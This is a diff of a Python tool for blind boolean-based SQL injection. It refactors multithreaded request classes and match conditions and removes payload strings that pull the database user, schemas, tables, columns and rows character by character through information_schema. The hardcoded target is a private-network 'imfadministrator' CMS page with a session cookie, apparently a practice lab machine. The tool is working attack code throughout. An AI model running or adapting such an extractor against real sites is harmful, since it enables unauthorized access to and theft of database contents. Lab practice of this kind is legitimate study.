@@ -2,6 +2,7 @@
 
 from dataclasses import dataclass
 from abc import ABC, abstractmethod
+from types import MethodType
 from pwn import *
 from typing import Tuple, Optional
 import requests
@@ -42,6 +43,14 @@ class Color:
 @dataclass
 class WrapperRequest:
     data: str | dict
+    character: int
+    main_url: str
+    headers: dict
+
+
+@dataclass
+class WrapperResponse:
+    response: requests.Response
     character: int
 
 
@@ -125,13 +134,17 @@ class TimePayload(Payload):
 
 class RequestType(ABC):
 
+    def __init__(self):
+        self.stop_threads = True
+
     @abstractmethod
-    def build_data(
+    def build_request(
         self,
-        data: dict,
+        data: str | dict,
         atribute_to_exploit: str,
         payload: Payload,
         main_url: str,
+        headers: dict,
         info_name: str,
         position: int,
         db: DB | None,
@@ -143,23 +156,21 @@ class RequestType(ABC):
     @abstractmethod
     def send_request(
         self,
-        main_url: str,
-        headers: dict,
         requests_data: WrapperRequest,
-        stop_threads: bool,
-    ) -> Tuple[Optional[requests.Response], str] | None:
+    ) -> WrapperResponse | None:
         """Send the request that contain the payload"""
         pass
 
 
 class PostRequest(RequestType):
 
-    def build_data(
+    def build_request(
         self,
-        data: dict,
+        data: str | dict,
         atribute_to_exploit: str,
         payload: Payload,
         main_url: str,
+        headers: dict,
         info_name: str,
         position: int,
         db: DB | None,
@@ -172,34 +183,36 @@ class PostRequest(RequestType):
         for character in characters:
             concat_payload = f"{data[atribute_to_exploit]}{payload.build_payload(info_name,position,character, db, table)}"
             data[atribute_to_exploit] = concat_payload
-            result.append(WrapperRequest(data, character))
+            result.append(WrapperRequest(data, character, main_url, headers))
 
         return result
 
     def send_request(
         self,
-        main_url: str,
-        headers: dict,
         requests_data: WrapperRequest,
-        stop_threads: bool,
-    ) -> Tuple[Optional[requests.Response], str] | None:
+    ) -> WrapperResponse | None:
 
-        if stop_threads:
+        if self.stop_threads:
             return None
 
-        response = requests.post(main_url, headers=headers, data=requests_data.data)
+        response = requests.post(
+            requests_data.main_url,
+            headers=requests_data.headers,
+            data=requests_data.data,
+        )
 
-        return response, chr(requests_data.character)
+        return WrapperResponse(response, requests_data.character)
 
 
 class GetRequest(RequestType):
 
-    def build_data(
+    def build_request(
         self,
-        data: dict,
+        data: str | dict,
         atribute_to_exploit: str,
         payload: Payload,
         main_url: str,
+        headers: dict,
         info_name: str,
         position: int,
         db: DB | None,
@@ -214,6 +227,8 @@ class GetRequest(RequestType):
                 WrapperRequest(
                     f"{main_url}{data}{payload.build_payload(info_name,position,character, db, table)}",
                     character,
+                    main_url,
+                    headers,
                 )
             )
 
@@ -221,24 +236,28 @@ class GetRequest(RequestType):
 
     def send_request(
         self,
-        main_url: str,
-        headers: dict,
         requests_data: WrapperRequest,
-        stop_threads: bool,
-    ) -> Tuple[Optional[requests.Response], str] | None:
+    ) -> WrapperResponse | None:
 
-        if stop_threads:
+        if self.stop_threads:
             return None
+        print(requests_data.headers)
+        print(requests_data.data)
+        response = requests.get(str(requests_data.data), requests_data.headers)
 
-        response = requests.get(str(requests_data.data), headers)
+        print(response.text)
 
-        return response, chr(requests_data.character)
+        if "Welcome to the IMF Administration" in response.text:
+            print(
+                f"Character: {chr(requests_data.character)} Findddddddddddddddddddddddddddd"
+            )
+        return WrapperResponse(response, requests_data.character)
 
 
 class Condition(ABC):
 
     def __init__(self, value: str):
-        self.__value = value
+        self._value = value
 
     @abstractmethod
     def get_condition(self, response: requests.Response) -> bool:
@@ -250,8 +269,10 @@ class TextInCondition(Condition):
     def get_condition(self, response: requests.Response) -> bool:
         result = False
 
-        if self.__value in response.text:
+        print(f"{self._value} NOT FOUND")
+        if self._value in response.text:
             result = True
+            print(f"{self._value} FOUND")
 
         return result
 
@@ -261,7 +282,7 @@ class StatusEqualCondition(Condition):
     def get_condition(self, response: requests.Response) -> bool:
         result = False
 
-        if self.__value == str(response.status_code):
+        if self._value == str(response.status_code):
             result = True
 
         return result
@@ -278,24 +299,25 @@ class Extractor:
 
     def __init__(
         self,
-        main_url,
-        method,
-        headers,
-        condition,
-        data,
-        atribute_to_exploit=None,
-        num_threads=1,
+        main_url: str,
+        headers: dict,
+        data: str | dict,
+        method: RequestType,
+        condition: Condition,
+        payload: Payload,
+        num_threads: int = 1,
+        atribute_to_exploit: str = "",
     ):
         self.main_url = main_url
         self.method = method
         self.headers = headers
         self.condition = condition
+        self.payload = payload
         self.num_threads = num_threads
         self.data = data
         self.atribute_to_exploit = atribute_to_exploit
-        self._stop_threads = True
         self._character_finded = 0
-        self._dbs = []
+        self._dbs: list = []
 
     @staticmethod
     def init_with_interface():
@@ -307,6 +329,7 @@ class Extractor:
         data: str | dict = {}
         atribute_to_exploit = ""
         condition = ""
+        payload = ConditionalPayload()
         num_threads = 1
 
         def get_input_rows(answer_size: int, text: str) -> int:
@@ -361,7 +384,10 @@ class Extractor:
             )
 
             if input_method and (input_method == "POST" or input_method == "GET"):
-                method = input_method
+                if input_method == "POST":
+                    method = PostRequest()
+                else:
+                    method = GetRequest()
                 label_method.status(input_method)
                 print("\033[A\033[J", end="")
                 break
@@ -452,7 +478,7 @@ class Extractor:
             )
 
             if input_condition:
-                condition = input_condition
+                condition = TextInCondition("input_condition")
                 label_condition.status(input_condition)
                 print("\033[A\033[J" * get_input_rows(77, input_data), end="")
                 break
@@ -480,7 +506,14 @@ class Extractor:
         label_threads.status(num_threads)
 
         return Extractor(
-            main_url, method, headers, condition, data, atribute_to_exploit, num_threads
+            main_url,
+            headers,
+            data,
+            method,
+            condition,
+            payload,
+            num_threads,
+            atribute_to_exploit,
         )
 
     def _select_color(self, info_name: str) -> str:
@@ -496,77 +529,6 @@ class Extractor:
 
         return switcher.get(info_name, Color.BLUE)
 
-    def _build_payload(
-        self,
-        exploit: str,
-        position: int,
-        character: int,
-        db: DB | None,
-        table: Table | None,
-    ) -> str:
-        """Build the payload to be used in dependency on what you want to extract from the database"""
-
-        result = ""
-
-        if exploit == "User":
-            result = (
-                f"' and (select ascii(substring(user(),{position},1)))='{character}"
-            )
-        elif exploit == "DBs":
-            result = f"' and (select ascii(substring(group_concat(schema_name),{position},1)) from information_schema.schemata)='{character}"
-        elif exploit == "Tables" and db is not None:
-            result = f"' and (select ascii(substring(group_concat(table_name),{position},1)) from information_schema.tables where table_schema='{db.name}')='{character}"
-        elif exploit == "Columns" and db is not None and table is not None:
-            result = f"' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"
-        elif exploit == "Rows" and db is not None and table is not None:
-            columns = table.concat_columns()
-            result = f"' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"
-
-        return result
-
-    def _build_data(
-        self, info_name: str, position: int, db: DB | None, table: Table | None
-    ) -> list:
-        """Build the data for the request in dependency of the request method"""
-
-        result = []
-        characters = list(range(33, 127))
-
-        for character in characters:
-            if self.method == "POST":
-                payload = f"{self.data[self.atribute_to_exploit]}{self._build_payload(info_name,position,character, db, table)}"
-                data = copy.copy(self.data)
-                data[self.atribute_to_exploit] = payload
-                result.append(WrapperRequest(data, character))
-            else:
-                result.append(
-                    WrapperRequest(
-                        f"{self.main_url}{self.data}{self._build_payload(info_name,position,character, db, table)}",
-                        character,
-                    )
-                )
-
-        return result
-
-    def _send_request(self, requests_data: WrapperRequest) -> str | None:
-        """Send the request that contain the payload, is the function that is used in threading"""
-
-        if self._stop_threads:
-            return None
-
-        if self.method == "POST":
-            response = requests.post(
-                self.main_url, headers=self.headers, data=requests_data.data
-            )
-        else:
-            response = requests.get(str(requests_data.data), headers=self.headers)
-
-        if self.condition in response.text:
-            self._character_finded = requests_data.character
-            self._stop_threads = True
-
-        return chr(requests_data.character)
-
     def _get_info(
         self,
         label_info,
@@ -577,29 +539,46 @@ class Extractor:
     ) -> str:
         """Use Multithreads, build the payload and data to send the request"""
 
-        self._stop_threads = True
+        self.method.stop_threads = True
         info = ""
         position = 1
 
-        while self._stop_threads:
-            self._stop_threads = False
+        while self.method.stop_threads:
+            self.method.stop_threads = False
 
-            requests_data = self._build_data(info_name, position, db, table)
+            requests_data = self.method.build_request(
+                self.data,
+                self.atribute_to_exploit,
+                self.payload,
+                self.main_url,
+                self.headers,
+                info_name,
+                position,
+                db,
+                table,
+            )
 
             with concurrent.futures.ThreadPoolExecutor(
                 max_workers=self.num_threads
             ) as executor:
                 futures = {
-                    executor.submit(self._send_request, data) for data in requests_data
+                    executor.submit(self.method.send_request, data)
+                    for data in requests_data
                 }
                 for future in concurrent.futures.as_completed(futures):
                     result = future.result()
-                    label_menu.status(result)
-                    if self._stop_threads:
+                    if result is not None:
+                        label_menu.status(chr(result.character))
+
+                        if self.condition.get_condition(result.response):
+                            self._character_finded = result.character
+                            self.method.stop_threads = True
+
+                    if self.method.stop_threads:
                         executor.shutdown(wait=False)
                         break
 
-            if self._stop_threads:
+            if self.method.stop_threads:
                 info += chr(self._character_finded)
                 label_info.status(f"{self._select_color(info_name)}{info}{Color.END}")
 
@@ -705,16 +684,24 @@ class Extractor:
 def main():
 
     # Initiate parameters specifying them
-    main_url = "http://192.168.130.132/imfadministrator/cms.php?pagename="
-    method = "GET"
-    headers = {"Cookie": "PHPSESSID=guk1as3f6a2o4a27gr97ppfmv3"}
-    condition = "Welcome to the IMF Administration"
-    num_threads = 3
+    main_url = "http://192.168.1.103/imfadministrator/cms.php?pagename="
+    headers = {"Cookie": "PHPSESSID=s0o0uhl9dthhao3c56lufjkte1"}
     data = "home"
+    method = GetRequest()
+    condition = TextInCondition("Welcome to the IMF Administration")
+    payload = ConditionalPayload()
+    num_threads = 1
     atribute_to_exploit = ""
 
     instance = Extractor(
-        main_url, method, headers, condition, data, atribute_to_exploit, num_threads
+        main_url,
+        headers,
+        data,
+        method,
+        condition,
+        payload,
+        num_threads,
+        atribute_to_exploit,
     )
 
     # Initiate parameters with interface
@@ -725,12 +712,15 @@ def main():
     print("\n")
     time.sleep(1)
 
-    instance.get_user(label_menu)
-    instance.get_dbs(label_menu)
-    instance.get_tables(label_menu)
-    instance.get_columns(label_menu)
-    instance.get_rows(label_menu)
-    instance.build_file()
+    response = requests.get("http://192.168.1.103")
+    print(str(response.text))
+
+    # instance.get_user(label_menu)
+    # instance.get_dbs(label_menu)
+    # instance.get_tables(label_menu)
+    # instance.get_columns(label_menu)
+    # instance.get_rows(label_menu)
+    # instance.build_file()
 
 
 if __name__ == "__main__":
